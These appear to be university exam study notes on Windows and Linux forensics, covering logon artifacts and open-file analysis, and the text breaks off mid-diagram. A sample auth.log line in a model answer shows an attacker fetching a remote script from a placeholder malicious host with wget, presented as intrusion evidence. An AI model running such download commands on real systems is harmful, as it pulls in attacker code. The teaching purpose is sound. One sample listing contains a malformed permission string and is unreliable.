<!-- SECTION_5_START -->
# Section 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short Answer Questions (3 Marks Each)

### Question 1 (3 Marks)
**[KTU University Exam — Model Paper 2024, PECCT866]**

> Explain the role of the SAM database in Windows forensics. Mention the location of the SAM hive and the significance of the `F` value.

**Model Answer:**

The **Security Account Manager (SAM)** is a Windows Registry hive that stores local user account information, including account names, Security Identifiers (SIDs), password hashes, and the timestamp of the last successful logon.

**Location:** `C:\Windows\System32\config\SAM` (must be parsed offline as it is locked at runtime).

**Significance of the `F` value:**
- The `F` value under each user SID key records the **last logon timestamp** in Windows FILETIME format (100-nanosecond intervals since 1601-01-01).
- It is the **only** persistent on-disk record of the last logon time for a local user account.
- It is independent of the Security Event Log — even if event logs are cleared, the SAM `F` value remains.
- It is critical for **historical attribution** when event log tampering is suspected.

---

### Question 2 (3 Marks)
**[KTU University Exam — Model Paper 2024, PECCT866]**

> List and briefly describe the four canonical log files used in Linux forensics to track user logon activity.

**Model Answer:**

| File | Purpose |
|---|---|
| **`/var/run/utmp`** | Records users *currently* logged in. Volatile — cleared on reboot. |
| **`/var/log/wtmp`** | Records all historical successful logons/logoffs/reboots. |
| **`/var/log/btmp`** | Records all failed login attempts (brute-force evidence). |
| **`/var/log/lastlog`** | Records the *most recent* logon for *every* system user account (sparse file, UID-indexed). |

These files follow the binary `utmp` structure and are read by commands such as `who`, `last`, `lastb`, and `lastlog`.

---

## 5.2 Part B — Long Answer Questions (14 Marks Each — Internal Choice)

### Question A (14 Marks)
**[KTU University Exam — Model Paper 2024, PECCT866]**

> **(a)** With a neat block diagram, explain the Windows authentication and logon process. Discuss in detail the significance of Logon Types 2, 3, 7, and 10 in Event ID 4624. **(7 Marks)**
>
> **(b)** Describe the procedure for extracting logged-on user artifacts from a Windows forensic image. Include the relevant registry paths, tools used, and the forensic significance of the `Winlogon` registry key. **(7 Marks)**

---

#### Model Solution to Question A(a) — 7 Marks

**Windows Authentication and Logon Process — Block Diagram:**

```
[User] --> [Logon Screen] --> [Winlogon.exe]
              |
              v
        [LSASS Process]
              |
        +-----+-----+--------+
        |     |     |        |
        v     v     v        v
     [SAM] [NTLM] [Kerberos] [Cached Creds]
        |     |     |        |
        +-----+-----+--------+
              |
              v
    [Logon Token Issued to User]
              |
              v
    [User Profile Loaded from ProfileList]
              |
              v
    [Shell Loaded (explorer.exe)]
              |
              v
    [Event ID 4624 Written to Security Log]
```

**Step-by-step explanation:**

1. The user provides credentials (username/password or smart card) at the logon screen.
2. `Winlogon.exe` captures the credentials and forwards them to the **Local Security Authority Subsystem Service (LSASS)**.
3. LSASS consults the appropriate authentication package:
   - **SAM** for local accounts
   - **NTLM** for domain/workgroup logons
   - **Kerberos** for Active Directory domain logons
   - **Cached Credentials** when offline
4. Upon successful authentication, LSASS issues a **logon token** representing the user's security context.
5. The user profile is loaded from the path in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`.
6. The user shell (`explorer.exe`) is launched.
7. A success audit event (ID 4624) is written to the Security Event Log.

**Logon Types in Event ID 4624:**

| Logon Type | Meaning | Forensic Significance |
|---|---|---|
| **2 (Interactive)** | Local keyboard logon at the physical console | Establishes physical presence at the keyboard |
| **3 (Network)** | Network-based authentication (file share, PsExec, WMI) | **Key indicator of lateral movement** |
| **7 (Unlock)** | Workstation unlocked from screensaver | Indicates the user was *already* logged in — supports continuous presence |
| **10 (RemoteInteractive)** | RDP / Terminal Services logon | **Strong indicator of remote access** — often the entry vector in ransomware attacks |

**Model Solution Mark Distribution:**
- Diagram: 2 marks
- Process steps: 3 marks
- Logon Type descriptions: 2 marks

---

#### Model Solution to Question A(b) — 7 Marks

**Procedure for Extracting Logged-on User Artifacts from a Windows Image:**

**Step 1: Image Acquisition and Mounting (1 mark)**
- Acquire a forensic image using FTK Imager or `dd` in raw/dd/E01 format.
- Mount the image **read-only** using FTK Imager, Arsenal Image Mounter, or `xmount`.

**Step 2: Registry Hive Extraction (2 marks)**
- Extract the three core hives from `C:\Windows\System32\config\`:
  - `SAM` — user account list, last logon timestamp (`F` value)
  - `SECURITY` — audit policy, logon sessions, cached credentials
  - `SYSTEM` — computer name, current control set, configuration
- Tools: **Registry Explorer** (Eric Zimmerman), **RegRipper** (Harlan Carvey), **FTK Registry Viewer**

**Step 3: Security Event Log Parsing (2 marks)**
- Extract `C:\Windows\System32\winevt\Logs\Security.evtx`.
- Filter for Event IDs **4624** (success), **4625** (failure), **4634/4647** (logoff), **4648** (explicit credentials).
- Tools: **Event Viewer**, **evtx_dump**, **KAPE**, **LogParser**

**Step 4: Winlogon Registry Key Analysis (2 marks)**
- Path: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- Critical values:
  - `AutoAdminLogon` — if `"1"`, system performs automatic logon
  - `DefaultUserName` — account used for auto-logon
  - `DefaultPassword` — **stored in PLAINTEXT** (severe misconfiguration)
  - `AutoLogonCount` — number of remaining auto-logon attempts
- **Forensic significance:** Reveals which account the system is configured to automatically log in. The plaintext password is a direct security finding and immediate compromise indicator.

**Key Forensic Takeaway:** Combining SAM `F` values, Security Event Log entries, and `Winlogon` configuration provides a complete picture of *who* logged in, *when*, and whether the system was configured for unattended access.

---

### Question B (14 Marks — Alternative)
**[KTU University Exam — Model Paper 2024, PECCT866]**

> **(a)** Describe the structure of the `utmp` file in Linux. Explain how the `who`, `w`, `last`, `lastb`, and `lastlog` commands extract information from the various log files. **(7 Marks)**
>
> **(b)** A Linux server is suspected to have been compromised. Outline the steps a forensic investigator would take to identify all logged-on users (current and historical), failed login attempts, and any privilege escalation events. Provide example commands and expected outputs. **(7 Marks)**

---

#### Model Solution to Question B(a) — 7 Marks

**The `utmp` File Structure:**

The `utmp` file is a binary file composed of fixed-size records (one per session event). Each record is a `struct utmp` containing:

- `ut_type` — record type (e.g., `USER_PROCESS`, `LOGIN_PROCESS`, `DEAD_PROCESS`)
- `ut_pid` — process ID of the login process
- `ut_line` — device name (e.g., `tty1`, `pts/0`)
- `ut_id` — terminal ID suffix
- `ut_user` — username
- `ut_host` — hostname or IP (for remote logins)
- `ut_tv` — timestamp (struct timeval with seconds + microseconds)

**Command-to-File Matrix:**

| Command | File Read | Output |
|---|---|---|
| `who` | `/var/run/utmp` | List of users currently logged in + their terminal + login time |
| `w` | `/var/run/utmp` + `/proc` | Same as `who` + additional info: idle time, JCPU, PCPU, current command |
| `last` | `/var/log/wtmp` | Full historical list of logon/logoff events, with durations |
| `lastb` | `/var/log/btmp` | Failed login attempts (same format as `last`) |
| `lastlog` | `/var/log/lastlog` | One row per system user showing their *most recent* logon time |

**Mark Distribution:**
- `utmp` structure: 3 marks
- Command descriptions: 4 marks

---

#### Model Solution to Question B(b) — 7 Marks

**Forensic Procedure for a Compromised Linux Server:**

**Step 1: Current Users (1 mark)**

```
Command: who /var/run/utmp
Expected Output:
    root     tty1         2024-09-23 09:00
    alice    pts/0        2024-09-23 09:15 (192.168.1.50)
    unknown  pts/1        2024-09-23 14:00 (203.0.113.99)  ← SUSPICIOUS
```

**Step 2: Historical Logons (2 marks)**

```
Command: last -f /var/log/wtmp -i
Expected Output:
    unknown  pts/1        203.0.113.99     Mon Sep 23 14:00   still logged in
    alice    pts/0        192.168.1.50     Mon Sep 23 09:15   still logged in
    root     tty1                          Mon Sep 23 09:00   still logged in
    carol    pts/0        192.168.1.70     Sun Sep 22 22:00 - 22:45 (00:45)
```

**Step 3: Failed Login Attempts (2 marks)**

```
Command: lastb -f /var/log/btmp | head -20
Expected Output:
    root     ssh:notty    203.0.113.99    Mon Sep 23 13:00 - 13:00 (00:00)
    admin    ssh:notty    203.0.113.99    Mon Sep 23 13:00 - 13:00 (00:00)
    oracle   ssh:notty    203.0.113.99    Mon Sep 23 12:59 - 12:59 (00:00)
    test     ssh:notty    203.0.113.99    Mon Sep 23 12:59 - 12:59 (00:00)
    [100+ rows] → BRUTE FORCE FROM 203.0.113.99
```

**Step 4: Privilege Escalation Detection (2 marks)**

```
Command: grep -i "sudo\|su:" /var/log/auth.log | tail -30
Expected Output (sample):
    Sep 23 14:05:01 server sudo: unknown : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
    Sep 23 14:06:33 server su[15000]: + /dev/pts/1 root:unknown
    Sep 23 14:07:00 server sudo: root : TTY=pts/1 ; PWD=/root ; COMMAND=/usr/bin/wget http://malicious.com/x.sh
```

**Forensic Conclusion:** User `unknown` (likely an attacker-created account) brute-forced SSH from `203.0.113.99`, successfully authenticated, escalated to `root` via `su`, and downloaded a remote shell script via `wget`. All logged-on user artifacts confirm the intrusion.

**Mark Distribution:**
- Current/historical users: 2 marks
- Failed login analysis: 2 marks
- Privilege escalation: 2 marks
- Forensic conclusion: 1 mark

---

> [!WARNING]
> **KTU Examiner's Valuation Warning / Common Pitfalls:**
>
> 1. **Confusing `utmp` with `wtmp`:** Students often state that `who` reads `wtmp`. **Incorrect.** `who` reads `utmp` (current users). `wtmp` is the historical log read by `last`.
>
> 2. **Forgetting the Logon Type:** When asked about Event ID 4624, students often list *who* logged in but **omit the Logon Type**. Always mention it — it is the single most discriminating field.
>
> 3. **Live vs. Offline Analysis:** Examiners deduct marks for suggesting `regedit` on a live suspect machine. Always specify **forensic image, mounted read-only, offline parsing**.
>
> 4. **Ignoring the `F` Value Conversion:** When asked about SAM last logon time, students must show the **FILETIME → Unix epoch** conversion formula. Marks are awarded for the calculation, not just the answer.
>
> 5. **Mixing up `last` and `lastb`:** `last` shows **successful** logons (`wtmp`). `lastb` shows **failed** logons (`btmp`). Confusing these is a guaranteed 0.5–1 mark deduction.
>
> 6. **Omitting the Brute-Force Analysis:** A list of failed logons without a conclusion (e.g., "this indicates a brute-force attack from IP X") is incomplete. Always provide the **investigative interpretation**.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid-Revision Checklist — "Logged-on Users" (Module 2, PECCT866)**

### Windows Forensics
- [x] **SAM hive** = `C:\Windows\System32\config\SAM` — local accounts, `F` value
- [x] **SECURITY hive** = `C:\Windows\System32\config\SECURITY` — logon sessions
- [x] **SYSTEM hive** = `C:\Windows\System32\config\SYSTEM` — config
- [x] **Security Event Log** = `C:\Windows\System32\winevt\Logs\Security.evtx`
- [x] **Event 4624** = successful logon (with **Logon Type**)
- [x] **Event 4625** = failed logon
- [x] **Event 4634/4647** = logoff
- [x] **Event 4648** = explicit credential use (RunAs)
- [x] **Event 4672** = special privileges (admin logon)
- [x] **Logon Type 2** = Interactive (local console)
- [x] **Logon Type 3** = Network (lateral movement)
- [x] **Logon Type 10** = RemoteInteractive (RDP)
- [x] **ProfileList** key = `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`
- [x] **Winlogon** key = `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — auto-logon, plaintext password
- [x] **FILETIME formula:** `Unix = (F - 116444736000000000) / 10000000`

### Linux Forensics
- [x] **`/var/run/utmp`** = current users, read by `who`, `w`
- [x] **`/var/log/wtmp`** = history, read by `last`
- [x] **`/var/log/btmp`** = failed logins, read by `lastb`
- [x] **`/var/log/lastlog`** = per-user last logon, read by `lastlog`
- [x] **`/var/log/auth.log`** (Debian) / **`/var/log/secure`** (RHEL) = authentication events
- [x] **`/etc/passwd` + `/etc/shadow`** = account inventory
- [x] **Brute-force signature** = rapid sequential `btmp` entries targeting `root`, `admin`, `oracle`, `test` from a single IP
- [x] **Privilege escalation signature** = `sudo:` lines in `auth.log` from non-admin users

### Cross-Platform Tools
- [x] **Windows:** Registry Explorer, RegRipper, FTK Imager, KAPE, Volatility
- [x] **Linux:** `who`, `w`, `last`, `lastb`, `lastlog`, `grep`, `ausearch` (auditd), `journalctl` (systemd)

### Forensic Principles
- [x] **Always operate on a forensic image**, never the live system
- [x] **Mount read-only** to preserve evidence integrity
- [x] **Hash the image** before and after analysis (chain of custody)
- [x] **Correlate multiple artifacts** — never rely on a single source
- [x] **Document timestamps with timezone** and convert to UTC for reports

---

<!-- SECTION_5_END -->

topics.title: Open Files
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT866 - WINDOWS AND LINUX FORENSICS
> - **Module:** Module 2
> - **Topic:** Open Files

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Definition (KTU 2024 Terminology)

> [!IMPORTANT]  
> **Open File**: In the context of operating system forensics, an *open file* refers to a file resource on a storage volume that currently holds an active reference (a *handle* in Windows or a *file descriptor* in Linux) from a running process. It is a volatile artifact representing the live, in-memory state of file system interaction, as opposed to the static on-disk persistence recorded in the Master File Table (MFT) or inode tables.

From a forensic standpoint, open files bridge the gap between **live system state (volatile memory)** and **on-disk artifacts (non-volatile storage)**. They reveal which user-mode and kernel-mode processes are actively reading, writing, mapping, or executing content from the file system at the precise moment of evidence acquisition.

### 1.2 Conceptual Analogy — The "Library Reading Room"

Imagine a vast library (your computer's hard drive) filled with millions of books (files). Most books sit idle on the shelves. However, a few books are currently being read or referenced by patrons (running processes). The library's front desk maintains a **sign-out register** showing which patron has which book open, on which page, and for how long.

- The **sign-out register** = The Operating System's internal *Handle Table* (Windows) or *Open File Table* (Linux).
- The **patrons** = Running processes (PIDs).
- The **books** = Files on disk.
- A **forensic investigator** entering the library during business hours sees a *live snapshot* of reading activity. If they wait until closing time (system shutdown), the register is wiped — the volatile evidence is lost forever.

This is precisely why **open file analysis** is a cornerstone of *Live System Forensics* and is performed *before* the machine is powered off.

### 1.3 Core Categories of Open Files

| Category | Windows Term | Linux Term | Forensic Value |
|----------|--------------|------------|----------------|
| Regular File I/O | File Handle | File Descriptor (`fd`) | Reveals active data access |
| Memory-Mapped File | Section Object (File Mapping) | `mmap()` Region | Indicates executable in RAM |
| Named Pipe | Pipe Handle | FIFO (`mkfifo`) | Inter-process covert channels |
| Network Socket | Socket Handle | Socket FD | Network connections per process |
| Directory Listing | Directory Handle | DIR Stream (`opendir`) | Recently traversed paths |
| Device File | Device Handle | `/dev/*` | Direct hardware access evidence |

> [!NOTE]  
> **Key Distinction (KTU 2024 High-Yield)**: A file *existing* on disk (verified by MFT/inode) is **non-volatile** evidence. A file *open in memory* (verified by handle table) is **volatile** evidence. Confusing these two states is one of the most common errors in KTU valuation scripts.

### 1.4 Why Open Files Matter in Forensics

- **Anti-Forensics Detection**: Malware frequently renames or deletes executables after execution. The process may still be *running* with the file *open*, leaving a discoverable trace.
- **User Activity Reconstruction**: Open document handles (e.g., `resume.docx`) reveal what the user was actively working on at the time of seizure.
- **Hidden Volume Detection**: Open encrypted containers (VeraCrypt, BitLocker) show mounted volumes that would otherwise be invisible.
- **Timeline Correlation**: File open times correlate with process execution times, validating or refuting suspect alibis.
- **Remote Access Evidence**: Open SMB/CIFS handles reveal active network shares being accessed.
</br>

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Cheat Sheet

### 2.1 Windows Internals — The Handle Table Architecture

Windows manages open files through a hierarchical kernel structure. Understanding this hierarchy is **mandatory** for KTU Module 2 questions.

#### 2.1.1 The Five-Layer Object Model

1. **Eprocess (Executive Process Block)** — Represents each running process.
2. **Handle Table (`_HANDLE_TABLE`)** — Per-process table indexing all kernel object references.
3. **File Object (`_FILE_OBJECT`)** — Kernel structure representing an *instance* of an open file.
4. **Device Object (`_DEVICE_OBJECT`)** — Represents the underlying volume or device driver.
5. **Vpb (Volume Parameter Block)** — Links the file object to a specific mounted volume and file system.

> [!IMPORTANT]  
> Every handle value you see in `handle.exe` or Process Hacker is merely an **index** into the Handle Table. The Handle Table entry points to a `FILE_OBJECT`, which in turn points to a `DEVICE_OBJECT` representing the volume's file system driver (e.g., `\Device\HarddiskVolume2`).

#### 2.1.2 Handle Table Entry Structure (Conceptual)

- **Pointer to Kernel Object** — Backed by `_FILE_OBJECT` for files.
- **Granted Access Mask** — Bitmask of permissions (e.g., `FILE_READ_DATA`, `FILE_WRITE_DATA`, `FILE_EXECUTE`).
- **Handle Attributes** — Flags such as `OBJ_INHERIT`, `OBJ_PERMANENT`, `OBJ_EXCLUSIVE`.
- **Audit Mask** — Used for Security Auditing events.

#### 2.1.3 Section Objects (Memory-Mapped Files)

When Windows *executes* a PE file (e.g., `cmd.exe`) or loads a DLL, it does not read the file repeatedly. Instead, it creates a **Section Object** that maps the file's disk contents directly into the process's virtual address space. Forensically:

- The original file can be **deleted from disk** while the process remains running.
- The mapped region in the process's working set still contains the executable code.
- Volatility's `filescan` and `dumpfiles` plugins recover these mapped files from RAM.

### 2.2 Linux Internals — File Descriptors and the `proc` Filesystem

Linux abstracts open files through a layered architecture rooted in the Virtual File System (VFS) layer.

#### 2.2.1 The VFS Abstraction Stack

1. **Process File Descriptor Table** — Per-process integer-indexed array (`fd 0`, `fd 1`, `fd 2` for stdin, stdout, stderr).
2. **Open File Description (`struct file`)** — Kernel struct shared by duplicated FDs (e.g., after `dup()` or `fork()`).
3. **Inode (`struct inode`)** — On-disk metadata: permissions, timestamps, size, block pointers.
4. **Superblock (`struct super_block`)** — Per-mounted file system metadata.

> [!NOTE]  
> Multiple FDs in different processes can point to the **same `struct file`** (e.g., after `fork()`), but each `struct file` has exactly one current file position pointer. This is critical when correlating concurrent writes.

#### 2.2.2 The `/proc/<pid>/` Virtual Filesystem

Linux exposes open file state for **every** running process through the pseudo-filesystem mounted at `/proc`. For a process with PID `4815`:

- `/proc/4815/fd/` — Directory of symbolic links, one per open file descriptor. Each link's target reveals the actual file path (e.g., `0 -> /dev/null`, `3 -> /home/user/secret.txt`).
- `/proc/4815/fdinfo/` — Per-fd metadata: current position, flags (`O_RDONLY`, `O_WRONLY`, `O_RDWR`, `O_APPEND`).
- `/proc/4815/maps` — Memory-mapped files (analogous to Windows Section Objects).
- `/proc/4815/exe` — Symlink to the executable that launched the process.

### 2.3 KTU High-Yield Formula & Symbol Cheat Sheet

> [!IMPORTANT]  
> While open file analysis is not formula-driven like cryptography, the following are the **canonical reference points** examiners expect students to cite from memory.

| Concept | Windows Notation | Linux Notation | Units / Format | Forensic Location |
|---------|------------------|----------------|----------------|-------------------|
| Process Identifier | `PID` (DWORD) | `pid_t` (integer) | Decimal | Task Manager / `ps` |
| Handle / FD Value | `HANDLE` (void*) | `int` | Decimal | `handle.exe` / `/proc/<pid>/fd` |
| File Object Pointer | `_FILE_OBJECT*` | `struct file*` | Hex address | Kernel debugger |
| Granted Access Mask | `0x00120089` (bitmask) | `O_RDONLY=0`, `O_WRONLY=1`, `O_RDWR=2` | Hex (Win) / Octal (Linux) | `handle.exe -a` / `fdinfo` |
| Section Object | `_SECTION_OBJECT*` | `vm_area_struct*` | Hex address | WinDbg / `/proc/<pid>/maps` |
| Volume Device | `\Device\HarddiskVolume2` | `/dev/sda2` | Path string | WinObj / `mount` |
| Symbolic Link Target | `C:\Users\Alice\file.txt` | `/home/alice/file.txt` | Absolute path | Registry / `/proc/<pid>/fd/N` |
| File Position | `_FILE_OBJECT.CurrentByteOffset` | `f_pos` (loff_t) | Bytes (offset) | `NtQueryInformationFile` / `lseek` |
| Open Count | `ShareAccess` counter | `f_count` refcount | Integer | `handle.exe` / `/proc/sys/fs/file-nr` |

### 2.4 Engineering Utility & Real-World Application

In enterprise incident response, open file analysis is integrated into the **NIST SP 800-86** workflow:

1. **Phase 1 — Planning**: Identify the scope of live data to capture (processes, handles, network connections).
2. **Phase 2 — Acquisition**: Use tools like FTK Imager (with Live Acquisition), KAPE, or Velociraptor to harvest handle tables *before* shutdown.
3. **Phase 3 — Analysis**: Cross-reference open handles with MFT entries and $MFT USN Journal to reconstruct the timeline.
4. **Phase 4 — Reporting**: Document which processes held which files open at the moment of seizure, supporting legal proceedings under chain-of-custody requirements.

Real-world scenarios where open file analysis is decisive:

- **Ransomware Investigation**: Identifying the ransom note's open handle to confirm encryption completion status.
- **Data Exfiltration Cases**: Detecting open handles to removable drives or cloud-sync folders (e.g., `OneDrive`, `Dropbox`).
- **Child Exploitation Cases**: Verifying active access to media files during the moment of the raid.
- **Insider Threat**: Proving an employee had a confidential spreadsheet open *while* logged into a competitor's VPN.
</br>

## 3. Step-by-Step Analytical Procedures & Forensic Workflow

### 3.1 Procedural Workflow — Windows Open File Forensics

The following is the **canonical KTU-recommended procedure** for performing open file analysis on a live Windows system. This procedure mirrors industry-standard practices validated by SANS and NIST.

#### Step 1 — Establish the Baseline

Document the live system state **before** touching any evidence. Record the date/time of acquisition, the investigator's identity, and the tool versions used.

$$
T_{acquisition} = \text{WallClock}(UTC) \;\; \text{recorded in evidence log}
$$

This timestamp is critical because open file data is **point-in-time volatile**. The same system analyzed 10 minutes later will show a different handle state.

#### Step 2 — Enumerate Running Processes

For each process, record the `EPROCESS` address, PID, Parent PID (PPID), and image path. This is the prerequisite for mapping handles to processes.

$$
\text{ProcessList} = \{P_1, P_2, \ldots, P_n\} \quad \text{where} \quad P_i = (PID_i, PPID_i, ImagePath_i, EP\_Addr_i)
$$

#### Step 3 — Enumerate Handles per Process

For each process $P_i$, walk its `_HANDLE_TABLE` to extract every handle entry. For each handle of type `File`:

$$
H_{i,j} = (\text{HandleValue}_j, \text{ObjectPointer}_j, \text{GrantedAccess}_j, \text{ObjectName}_j)
$$

A practical command-line invocation on a live Windows host:

```
handle.exe -a -p <PID> > handles_PID.txt
handle.exe -a > all_handles.txt
```

The `-a` flag forces display of the full granted-access mask and the underlying file path, including the symbolic link target (e.g., `C:\Users\Alice\Documents\contract.pdf`).

#### Step 4 — Identify File-Type Handles

Filter the dump to retain only entries where the object type is `File`. This excludes `Key` (registry), `Event`, `Mutant` (mutex), `Semaphore`, `Thread`, and `Process` objects.

$$
\text{FileHandles}_i = \{H_{i,j} \mid \text{Type}(H_{i,j}) = \text{File}\}
$$

#### Step 5 — Resolve Symbolic Links

Many Windows file paths are stored in *DOS Device* form (e.g., `\Device\HarddiskVolume2\Users\Alice\file.txt`). Resolve these to user-friendly drive letters using the `\\DosDevices\\C:` symbolic link in the process's object directory.

#### Step 6 — Cross-Reference with MFT and $LogFile

For each unique file path obtained, query the Master File Table (MFT) to obtain:

- **$STANDARD_INFORMATION** timestamps (MAC times: Modified, Accessed, Changed).
- **$FILE_NAME** timestamps (used for anti-forensic timestamp manipulation detection).
- **$LogFile** Journal entries showing the most recent `FsRtl` operations.

$$
\text{Correlate}(H_{i,j}, MFT_{entry}) = (\text{FileName}, SI_{MAC}, FN_{MAC}, LogSeq)
$$

#### Step 7 — Memory Dump and Section Object Recovery

Use a memory forensic framework such as **Volatility** to extract memory-mapped (Section) files:

```
volatility.exe -f memdump.raw --profile=Win10x64 filescan
volatility.exe -f memdump.raw --profile=Win10x64 dumpfiles -D ./extracted/
```

The `filescan` plugin enumerates `_FILE_OBJECT` structures directly from kernel memory, while `dumpfiles` extracts the on-disk-mapped content.

### 3.2 Procedural Workflow — Linux Open File Forensics

#### Step 1 — Process Enumeration

$$
\text{ProcessList} = \text{output of} \;\; \text{ps auxww} \;\; \text{or} \;\; \text{ls /proc} \mid \text{grep '^[0-9]'}
$$

#### Step 2 — File Descriptor Enumeration via `/proc`

For a specific PID `4815`, list the open file descriptors:

```
ls -la /proc/4815/fd/ > fd_4815.txt
```

The output for a process editing a log file may look like:

```
lrwx------ 1 user user 64 Jan 15 10:23 0 -> /dev/null
lrwx------ 1 user user 64 Jan 15 10:23 1 -> /dev/null
lrwx------ 1 user user 64 Jan 15 10:23 2 -> /dev/null
lr-u------- 1 user user 64 Jan 15 10:25 3 -> /home/user/access.log
lrwx------ 1 user user 64 Jan 15 10:23 4 -> socket:[12345]
```

> [!NOTE]  
> The `l` flags (`lrwx------`) reveal the FD mode: `r` = read, `w` = write, `x` = execute. A socket entry showing `socket:[12345]` indicates a network connection whose full details can be retrieved from `/proc/net/tcp` and `/proc/net/unix`.

#### Step 3 — Detailed FD Metadata

For granular information including current file position and access flags:

```
cat /proc/4815/fdinfo/3
```

Typical output:

```
pos:    1024
flags:  0100002
mnt_id: 25
```

The `flags` value `0100002` (octal) decodes as `O_RDWR` (0x2) combined with the `O_LARGEFILE` flag (0100000). The `pos` field gives the current file offset in bytes.

#### Step 4 — Memory-Mapped File Enumeration

```
cat /proc/4815/maps
```

A typical line:

```
7f8b2c000000-7f8b2c021000 r-xp 00000000 08:01 12345 /usr/bin/python3
```

This reveals that the process has mapped the Python 3 binary into its address space with read+execute permissions, starting at virtual address `0x7f8b2c000000`.

#### Step 5 — Use of `lsof` (List Open Files)

The `lsof` utility is the de-facto standard for Linux open file analysis:

```
lsof -p 4815 > lsof_4815.txt
lsof +D /home/user > lsof_home_user.txt
```

The `-p` flag restricts output to a single PID. The `+D` flag recursively lists all open files under a directory tree.

#### Step 6 — Cross-Reference with Inode Metadata

For each file path discovered, query the inode to obtain `atime`, `mtime`, and `ctime`:

```
stat /home/user/access.log
```

Output:

```
Access: 2024-01-15 10:25:32.481 +0000
Modify: 2024-01-15 10:25:31.102 +0000
Change: 2024-01-15 10:25:31.102 +0000
```

> [!WARNING]  
> On modern Linux systems with `relatime` or `noatime` mount options, the **access time** may not update on every read. Forensic investigators must verify the mount options via `cat /proc/mounts` before relying on `atime` evidence.

### 3.3 Analytical Decision Matrix — When to Use Which Tool

| Scenario | Windows Tool | Linux Tool | Volatility Plugin |
|----------|--------------|------------|-------------------|
| Quick live triage | `handle.exe` (Sysinternals) | `lsof` | N/A (live only) |
| Comprehensive process-FD map | Process Hacker + raw handle table walk | `/proc/<pid>/fd` enumeration | `linux_lsof` |
| Deleted-but-mapped file recovery | FTK Imager memory dump | `grep` on `/proc/kcore` (advanced) | `filescan` + `dumpfiles` |
| Network socket per process | TCPView / `netstat -ano -b` | `ss -p` / `lsof -i` | `netscan` |
| Historical registry artifacts | `UserAssist`, `RecentDocs`, `OpenSavePidlMRU` | `recently-used.xbel`, `~/.local/share/recently-used.xbel` | `shellbags`, `userassist` |
| Timeline reconstruction | Plaso / log2timeline | Plaso / log2timeline | `timeliner` |
</br>

## 4. Structural Diagrams & Schematics

### 4.1 Windows Open File Object Hierarchy

```mermaid
flowchart TD
    EPRO[EPROCESS - Process Block]
    HTable[Handle Table - _HANDLE_TABLE]
    HEntry1[Handle Entry 0x0004]
    HEntry2[Handle Entry 0x0008]
    HEntry3[Handle Entry 0x0010]
    FObj1[FILE_OBJECT 1 - C:\\Users\\Alice\\file.txt]
    FObj2[FILE_OBJECT 2 - C:\\Windows\\System32\\notepad.exe]
    FObj3[FILE_OBJECT 3 - Section Object - DLL Mapping]
    DevObj1[DEVICE_OBJECT - \\Device\\HarddiskVolume2 - NTFS Driver]
    DevObj2[DEVICE_OBJECT - \\Device\\HarddiskVolume1 - Boot Volume]
    VPBlock[Volume Parameter Block - Mounted Volume Metadata]
    VOlMeta[Volume Serial Number, File System Type, Cluster Size]

    EPRO --> HTable
    HTable --> HEntry1
    HTable --> HEntry2
    HTable --> HEntry3
    HEntry1 --> FObj1
    HEntry2 --> FObj2
    HEntry3 --> FObj3
    FObj1 --> DevObj1
    FObj2 --> DevObj1
    FObj3 --> DevObj2
    DevObj1 --> VPBlock
    VPBlock --> VOlMeta
```

> [!NOTE]  
> **Reading the diagram**: Each running process (left) owns one Handle Table, which contains many Handle Entries. Each Handle Entry is an index pointing to a `FILE_OBJECT` (the in-memory representation of an open file). The `FILE_OBJECT` connects to a `DEVICE_OBJECT` representing the volume's file system driver, which in turn points to the Volume Parameter Block containing the actual storage metadata.

### 4.2 Linux Open File Descriptor Stack

```mermaid
flowchart TD
    ProcA[Process A - PID 4815 - bash]
    ProcB[Process B - PID 4816 - cat]
    FDTab1[FD Table - Process A]
    FDTab2[FD Table - Process B]
    FD0A[FD 0 - stdin]
    FD1A[FD 1 - stdout]
    FD3A[FD 3 - access.log]
    FD0B[FD 0 - pipe from A]
    FD1B[FD 1 - stdout terminal]
    OpenFile1[struct file - access.log - pos=1024, flags=O_RDWR]
    OpenFile2[struct file - pipe inode - shared between A and B]
    InodeLog[inode - access.log - mtime, ctime, atime, size]
    InodePipe[inode - pipe - S_IFIFO]
    Superblk[Superblock - /dev/sda2 - ext4 - 4096 byte blocks]
    DiskBlock[Disk Blocks - 0x1234 to 0x1244 - actual file content]

    ProcA --> FDTab1
    ProcB --> FDTab2
    FDTab1 --> FD0A
    FDTab1 --> FD1A
    FDTab1 --> FD3A
    FDTab2 --> FD0B
    FDTab2 --> FD1B
    FD3A --> OpenFile1
    FD0B --> OpenFile2
    FD1A --> OpenFile2
    OpenFile1 --> InodeLog
    OpenFile2 --> InodePipe
    InodeLog --> Superblk
    InodePipe --> Superblk
    Superblk --> DiskBlock
```

> [!IMPORTANT]  
> **Key Forensic Insight from the diagram**: Process A's `stdout` (FD 1) and Process B's `stdin` (FD 0) both point to the **same `struct file`** (the pipe). This shared kernel object is how Linux implements inter-process communication. An investigator examining a covert exfiltration channel should look for unexpected shared `struct file` references between seemingly unrelated processes.

### 4.3 Live Acquisition Workflow for Open File Evidence

```mermaid
flowchart TD
    Start([Incident Detected - System Still Running])
    Step1[Step 1 - Document Live State - Date, Time, Investigator, Tool Versions]
    Step2[Step 2 - Capture Volatile Data - RAM Dump, Network Connections, Process List]
    Step3[Step 3 - Enumerate Open Files - handle.exe on Windows or lsof on Linux]
    Step4[Step 4 - Resolve Symbolic Links - Drive Letter Mapping on Windows]
    Step5[Step 5 - Cross-Reference MFT or inode Entries]
    Step6[Step 6 - Extract Memory-Mapped Files - Volatility dumpfiles Plugin]
    Step7[Step 7 - Hash and Log All Artifacts - SHA256 + Chain of Custody]
    Step8[Step 8 - Generate Timeline - Plaso / log2timeline]
